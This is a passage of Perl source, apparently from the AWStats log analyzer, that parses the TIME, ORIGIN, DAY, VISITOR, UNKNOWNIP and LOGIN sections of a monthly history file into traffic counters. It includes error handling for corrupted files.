<HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_CLUSTER'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_CLUSTER\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_CLUSTER'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_CLUSTER\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section CLUSTER not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of CLUSTER section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'cluster'};\n\t\t\t\tif ( $SectionsToSave{'cluster'} ) {\n\t\t\t\t\tSave_History( 'cluster', $year, $month, $date );\n\t\t\t\t\tdelete $SectionsToSave{'cluster'};\n\t\t\t\t\tif ($withpurge) {\n\t\t\t\t\t\t%_cluster_p = ();\n\t\t\t\t\t\t%_cluster_h = ();\n\t\t\t\t\t\t%_cluster_k = ();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_TIME\n\t\t\tif ( $field[0] eq 'BEGIN_TIME' ) {\n\t\t\t\tmy $monthpages          = 0;\n\t\t\t\tmy $monthhits           = 0;\n\t\t\t\tmy $monthbytes          = 0;\n\t\t\t\tmy $monthnotviewedpages = 0;\n\t\t\t\tmy $monthnotviewedhits  = 0;\n\t\t\t\tmy $monthnotviewedbytes = 0;\n\t\t\t\tif ($Debug) { debug(\" Begin of TIME section\"); }\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\n\t\t\t\t\tif ( $field[0] ne '' )\n\t\t\t\t\t{    # Test on ne '' because field[0] is '0' for hour 0)\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'time'} ) {\n\t\t\t\t\t\t\tif (   $withupdate\n\t\t\t\t\t\t\t\t|| $MonthRequired eq 'all'\n\t\t\t\t\t\t\t\t|| $MonthRequired eq \"$month\" )\n\t\t\t\t\t\t\t{    # Still required\n\t\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t\t$_time_p[ $field[0] ] += int( $field[1] );\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tif ( $field[2] ) {\n\t\t\t\t\t\t\t\t\t$_time_h[ $field[0] ] += int( $field[2] );\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tif ( $field[3] ) {\n\t\t\t\t\t\t\t\t\t$_time_k[ $field[0] ] += int( $field[3] );\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tif ( $field[4] ) {\n\t\t\t\t\t\t\t\t\t$_time_nv_p[ $field[0] ] +=\n\t\t\t\t\t\t\t\t\t  int( $field[4] );\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tif ( $field[5] ) {\n\t\t\t\t\t\t\t\t\t$_time_nv_h[ $field[0] ] +=\n\t\t\t\t\t\t\t\t\t  int( $field[5] );\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tif ( $field[6] ) {\n\t\t\t\t\t\t\t\t\t$_time_nv_k[ $field[0] ] +=\n\t\t\t\t\t\t\t\t\t  int( $field[6] );\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t$monthpages          += int( $field[1] );\n\t\t\t\t\t\t\t$monthhits           += int( $field[2] );\n\t\t\t\t\t\t\t$monthbytes          += int( $field[3] );\n\t\t\t\t\t\t\t$monthnotviewedpages += int( $field[4] || 0 );\n\t\t\t\t\t\t\t$monthnotviewedhits  += int( $field[5] || 0 );\n\t\t\t\t\t\t\t$monthnotviewedbytes += int( $field[6] || 0 );\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_TIME'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_TIME\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_TIME'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_TIME\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section TIME not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of TIME section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\t$MonthPages{ $year . $month }          += $monthpages;\n\t\t\t\t$MonthHits{ $year . $month }           += $monthhits;\n\t\t\t\t$MonthBytes{ $year . $month }          += $monthbytes;\n\t\t\t\t$MonthNotViewedPages{ $year . $month } += $monthnotviewedpages;\n\t\t\t\t$MonthNotViewedHits{ $year . $month }  += $monthnotviewedhits;\n\t\t\t\t$MonthNotViewedBytes{ $year . $month } += $monthnotviewedbytes;\n\t\t\t\tdelete $SectionsToLoad{'time'};\n\n\t\t\t\tif ( $SectionsToSave{'time'} ) {\n\t\t\t\t\tSave_History( 'time', $year, $month, $date );\n\t\t\t\t\tdelete $SectionsToSave{'time'};\n\t\t\t\t\tif ($withpurge) {\n\t\t\t\t\t\t@_time_p    = ();\n\t\t\t\t\t\t@_time_h    = ();\n\t\t\t\t\t\t@_time_k    = ();\n\t\t\t\t\t\t@_time_nv_p = ();\n\t\t\t\t\t\t@_time_nv_h = ();\n\t\t\t\t\t\t@_time_nv_k = ();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_ORIGIN\n\t\t\tif ( $field[0] eq 'BEGIN_ORIGIN' ) {\n\t\t\t\tif ($Debug) { debug(\" Begin of ORIGIN section\"); }\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'origin'} ) {\n\t\t\t\t\t\t\tif ( $field[0] eq 'From0' ) {\n\t\t\t\t\t\t\t\t$_from_p[0] += $field[1];\n\t\t\t\t\t\t\t\t$_from_h[0] += $field[2];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telsif ( $field[0] eq 'From1' ) {\n\t\t\t\t\t\t\t\t$_from_p[1] += $field[1];\n\t\t\t\t\t\t\t\t$_from_h[1] += $field[2];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telsif ( $field[0] eq 'From2' ) {\n\t\t\t\t\t\t\t\t$_from_p[2] += $field[1];\n\t\t\t\t\t\t\t\t$_from_h[2] += $field[2];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telsif ( $field[0] eq 'From3' ) {\n\t\t\t\t\t\t\t\t$_from_p[3] += $field[1];\n\t\t\t\t\t\t\t\t$_from_h[3] += $field[2];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telsif ( $field[0] eq 'From4' ) {\n\t\t\t\t\t\t\t\t$_from_p[4] += $field[1];\n\t\t\t\t\t\t\t\t$_from_h[4] += $field[2];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telsif ( $field[0] eq 'From5' ) {\n\t\t\t\t\t\t\t\t$_from_p[5] += $field[1];\n\t\t\t\t\t\t\t\t$_from_h[5] += $field[2];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_ORIGIN'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_ORIGIN\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_ORIGIN'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_ORIGIN\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section ORIGIN not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of ORIGIN section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'origin'};\n\t\t\t\tif ( $SectionsToSave{'origin'} ) {\n\t\t\t\t\tSave_History( 'origin', $year, $month, $date );\n\t\t\t\t\tdelete $SectionsToSave{'origin'};\n\t\t\t\t\tif ($withpurge) { @_from_p = (); @_from_h = (); }\n\t\t\t\t}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_DAY\n\t\t\tif ( $field[0] eq 'BEGIN_DAY' ) {\n\t\t\t\tif ($Debug) { debug(\" Begin of DAY section\"); }\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'day'} ) {\n\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t$DayPages{ $field[0] } += int( $field[1] );\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t$DayHits{ $field[0] } +=\n\t\t\t\t\t\t\t  int( $field[2] )\n\t\t\t\t\t\t\t  ; # DayHits always load (should be >0 and if not it's a day YYYYMM00 resulting of an old file migration)\n\t\t\t\t\t\t\tif ( $field[3] ) {\n\t\t\t\t\t\t\t\t$DayBytes{ $field[0] } += int( $field[3] );\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ( $field[4] ) {\n\t\t\t\t\t\t\t\t$DayVisits{ $field[0] } += int( $field[4] );\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_DAY'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_DAY\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif ( $field[0] ne 'END_DAY' && $field[0] ne \"${xmleb}END_DAY\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section DAY not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of DAY section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'day'};\n\n# WE DO NOT SAVE SECTION NOW BECAUSE VALUES CAN BE CHANGED AFTER READING VISITOR\n#if ($SectionsToSave{'day'}) {\t# Must be made after read of visitor\n#\tSave_History('day',$year,$month,$date); delete $SectionsToSave{'day'};\n#\tif ($withpurge) { %DayPages=(); %DayHits=(); %DayBytes=(); %DayVisits=(); }\n#}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_VISITOR\n\t\t\tif ( $field[0] eq 'BEGIN_VISITOR' ) {\n\t\t\t\tif ($Debug) { debug(\" Begin of VISITOR section\"); }\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\n\t\t\t\t\t\t# For backward compatibility\n\t\t\t\t\t\tif ($readvisitorforbackward) {\n\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t$MonthUnique{ $year . $month }++;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ( $MonthRequired ne 'all' ) {\n\t\t\t\t\t\t\t\tif (   $field[0] !~ /^\\d+\\.\\d+\\.\\d+\\.\\d+$/\n\t\t\t\t\t\t\t\t\t&& $field[0] !~ /^[0-9A-F]*:/i )\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t$MonthHostsKnown{ $year . $month }++;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\telse { $MonthHostsUnknown{ $year . $month }++; }\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t# Process data saved in 'wait' arrays\n\t\t\t\t\t\tif ( $withupdate && $_waithost_e{ $field[0] } ) {\n\t\t\t\t\t\t\tmy $timehostl = int( $field[4] || 0 );\n\t\t\t\t\t\t\tmy $timehosts = int( $field[5] || 0 );\n\t\t\t\t\t\t\tmy $newtimehosts = (\n\t\t\t\t\t\t\t\t  $_waithost_s{ $field[0] }\n\t\t\t\t\t\t\t\t? $_waithost_s{ $field[0] }\n\t\t\t\t\t\t\t\t: $_host_s{ $field[0] }\n\t\t\t\t\t\t\t);\n\t\t\t\t\t\t\tmy $newtimehostl = (\n\t\t\t\t\t\t\t\t  $_waithost_l{ $field[0] }\n\t\t\t\t\t\t\t\t? $_waithost_l{ $field[0] }\n\t\t\t\t\t\t\t\t: $_host_l{ $field[0] }\n\t\t\t\t\t\t\t);\n\t\t\t\t\t\t\tif ( $newtimehosts > $timehostl + $VISITTIMEOUT ) {\n\t\t\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\t\t\tdebug(\n\" Visit for $field[0] in 'wait' arrays is a new visit different than last in history\",\n\t\t\t\t\t\t\t\t\t\t4\n\t\t\t\t\t\t\t\t\t);\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tif ( $field[6] ) { $_url_x{ $field[6] }++; }\n\t\t\t\t\t\t\t\t$_url_e{ $_waithost_e{ $field[0] } }++;\n\t\t\t\t\t\t\t\t$newtimehosts =~ /^(\\d\\d\\d\\d\\d\\d\\d\\d)/;\n\t\t\t\t\t\t\t\t$DayVisits{$1}++;\n\t\t\t\t\t\t\t\tif ( $timehosts && $timehostl ) {\n\t\t\t\t\t\t\t\t\t$_session{\n\t\t\t\t\t\t\t\t\t\tGetSessionRange( $timehosts,\n\t\t\t\t\t\t\t\t\t\t\t$timehostl )\n\t\t\t\t\t\t\t\t\t  }++;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tif ( $_waithost_s{ $field[0] } ) {\n\n\t   # First session found in log was followed by another one so it's finished\n\t\t\t\t\t\t\t\t\t$_session{\n\t\t\t\t\t\t\t\t\t\tGetSessionRange( $newtimehosts,\n\t\t\t\t\t\t\t\t\t\t\t$newtimehostl )\n\t\t\t\t\t\t\t\t\t  }++;\n\t\t\t\t\t\t\t\t}\n\n\t\t\t\t\t # Here $_host_l $_host_s and $_host_u are correctly defined\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\t\t\tdebug(\n\" Visit for $field[0] in 'wait' arrays is following of last visit in history\",\n\t\t\t\t\t\t\t\t\t\t4\n\t\t\t\t\t\t\t\t\t);\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tif ( $_waithost_s{ $field[0] } ) {\n\n\t   # First session found in log was followed by another one so it's finished\n\t\t\t\t\t\t\t\t\t$_session{\n\t\t\t\t\t\t\t\t\t\tGetSessionRange(\n\t\t\t\t\t\t\t\t\t\t\tMinimumButNoZero(\n\t\t\t\t\t\t\t\t\t\t\t\t$timehosts, $newtimehosts\n\t\t\t\t\t\t\t\t\t\t\t),\n\t\t\t\t\t\t\t\t\t\t\t$timehostl > $newtimehostl\n\t\t\t\t\t\t\t\t\t\t\t? $timehostl\n\t\t\t\t\t\t\t\t\t\t\t: $newtimehostl\n\t\t\t\t\t\t\t\t\t\t)\n\t\t\t\t\t\t\t\t\t  }++;\n\n\t\t\t\t\t # Here $_host_l $_host_s and $_host_u are correctly defined\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\telse {\n\n\t\t\t\t\t\t\t\t\t# We correct $_host_l $_host_s and $_host_u\n\t\t\t\t\t\t\t\t\tif ( $timehostl > $newtimehostl ) {\n\t\t\t\t\t\t\t\t\t\t$_host_l{ $field[0] } = $timehostl;\n\t\t\t\t\t\t\t\t\t\t$_host_u{ $field[0] } = $field[6];\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\tif ( $timehosts < $newtimehosts ) {\n\t\t\t\t\t\t\t\t\t\t$_host_s{ $field[0] } = $timehosts;\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tdelete $_waithost_e{ $field[0] };\n\t\t\t\t\t\t\tdelete $_waithost_l{ $field[0] };\n\t\t\t\t\t\t\tdelete $_waithost_s{ $field[0] };\n\t\t\t\t\t\t\tdelete $_waithost_u{ $field[0] };\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t# Load records\n\t\t\t\t\t\tif (   $readvisitorforbackward != 2\n\t\t\t\t\t\t\t&& $SectionsToLoad{'visitor'} )\n\t\t\t\t\t\t{    # if readvisitorforbackward==2 we do not load\n\t\t\t\t\t\t\tmy $loadrecord = 0;\n\t\t\t\t\t\t\tif ($withupdate) {\n\t\t\t\t\t\t\t\t$loadrecord = 1;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\tif (   $HTMLOutput{'allhosts'}\n\t\t\t\t\t\t\t\t\t|| $HTMLOutput{'lasthosts'} )\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\tif (\n\t\t\t\t\t\t\t\t\t\t(\n\t\t\t\t\t\t\t\t\t\t\t!$FilterIn{'host'}\n\t\t\t\t\t\t\t\t\t\t\t|| $field[0] =~ /$FilterIn{'host'}/i\n\t\t\t\t\t\t\t\t\t\t)\n\t\t\t\t\t\t\t\t\t\t&& ( !$FilterEx{'host'}\n\t\t\t\t\t\t\t\t\t\t\t|| $field[0] !~\n\t\t\t\t\t\t\t\t\t\t\t/$FilterEx{'host'}/i )\n\t\t\t\t\t\t\t\t\t  )\n\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t$loadrecord = 1;\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\telsif ($MonthRequired eq 'all'\n\t\t\t\t\t\t\t\t\t|| $field[2] >= $MinHit{'Host'} )\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\tif (\n\t\t\t\t\t\t\t\t\t\t$HTMLOutput{'unknownip'}\n\t\t\t\t\t\t\t\t\t\t&& ( $field[0] =~ /^\\d+\\.\\d+\\.\\d+\\.\\d+$/\n\t\t\t\t\t\t\t\t\t\t\t|| $field[0] =~ /^[0-9A-F]*:/i )\n\t\t\t\t\t\t\t\t\t  )\n\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t$loadrecord = 1;\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\telsif (\n\t\t\t\t\t\t\t\t\t\t$HTMLOutput{'main'}\n\t\t\t\t\t\t\t\t\t\t&& (   $MonthRequired eq 'all'\n\t\t\t\t\t\t\t\t\t\t\t|| $countloaded <\n\t\t\t\t\t\t\t\t\t\t\t$MaxNbOf{'HostsShown'} )\n\t\t\t\t\t\t\t\t\t  )\n\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t$loadrecord = 1;\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ($loadrecord) {\n\t\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t\t$_host_p{ $field[0] } += $field[1];\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tif ( $field[2] ) {\n\t\t\t\t\t\t\t\t\t$_host_h{ $field[0] } += $field[2];\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tif ( $field[3] ) {\n\t\t\t\t\t\t\t\t\t$_host_k{ $field[0] } += $field[3];\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tif ( $field[4] && !$_host_l{ $field[0] } )\n\t\t\t\t\t\t\t\t{ # We save last connexion params if not previously defined\n\t\t\t\t\t\t\t\t\t$_host_l{ $field[0] } = int( $field[4] );\n\t\t\t\t\t\t\t\t\tif ($withupdate)\n\t\t\t\t\t\t\t\t\t{ # field[5] field[6] are used only for update\n\t\t\t\t\t\t\t\t\t\tif ( $field[5]\n\t\t\t\t\t\t\t\t\t\t\t&& !$_host_s{ $field[0] } )\n\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t$_host_s{ $field[0] } =\n\t\t\t\t\t\t\t\t\t\t\t  int( $field[5] );\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\tif ( $field[6]\n\t\t\t\t\t\t\t\t\t\t\t&& !$_host_u{ $field[0] } )\n\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t$_host_u{ $field[0] } = $field[6];\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_VISITOR'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_VISITOR\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_VISITOR'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_VISITOR\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section VISITOR not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of VISITOR section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'visitor'};\n\n# WE DO NOT SAVE SECTION NOW TO BE SURE TO HAVE THIS LARGE SECTION NOT AT THE BEGINNING OF FILE\n#if ($SectionsToSave{'visitor'}) {\n#\tSave_History('visitor',$year,$month,$date); delete $SectionsToSave{'visitor'};\n#\tif ($withpurge) { %_host_p=(); %_host_h=(); %_host_k=(); %_host_l=(); %_host_s=(); %_host_u=(); }\n#}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_UNKNOWNIP for backward compatibility\n\t\t\tif ( $field[0] eq 'BEGIN_UNKNOWNIP' ) {\n\t\t\t\tmy %iptomigrate = ();\n\t\t\t\tif ($Debug) { debug(\" Begin of UNKNOWNIP section\"); }\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'unknownip'} ) {\n\t\t\t\t\t\t\t$iptomigrate{ $field[0] } = $field[1] || 0;\n\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_UNKNOWNIP'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_UNKNOWNIP\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_UNKNOWNIP'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_UNKNOWNIP\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section UNKOWNIP not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of UNKOWNIP section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'visitor'};\n\n# THIS SECTION IS NEVER SAVED. ONLY READ FOR MIGRATE AND CONVERTED INTO VISITOR SECTION\n\t\t\t\tforeach ( keys %iptomigrate ) {\n\t\t\t\t\t$_host_p{$_} += int( $_host_p{'Unknown'} / $countloaded );\n\t\t\t\t\t$_host_h{$_} += int( $_host_h{'Unknown'} / $countloaded );\n\t\t\t\t\t$_host_k{$_} += int( $_host_k{'Unknown'} / $countloaded );\n\t\t\t\t\tif ( $iptomigrate{$_} > 0 ) {\n\t\t\t\t\t\t$_host_l{$_} = $iptomigrate{$_};\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tdelete $_host_p{'Unknown'};\n\t\t\t\tdelete $_host_h{'Unknown'};\n\t\t\t\tdelete $_host_k{'Unknown'};\n\t\t\t\tdelete $_host_l{'Unknown'};\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_LOGIN\n\t\t\tif ( $field[0] eq 'BEGIN_LOGIN' ) {\n\t\t\t\tif ($Debug) { debug(\" Begin of LOGIN section\"); }\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'login'} ) {\n\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t$_login_p{ $field[0] } += $field[1];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ( $field[2] ) {\n\t\t\t\t\t\t\t\t$_login_h{ $field[0] } += 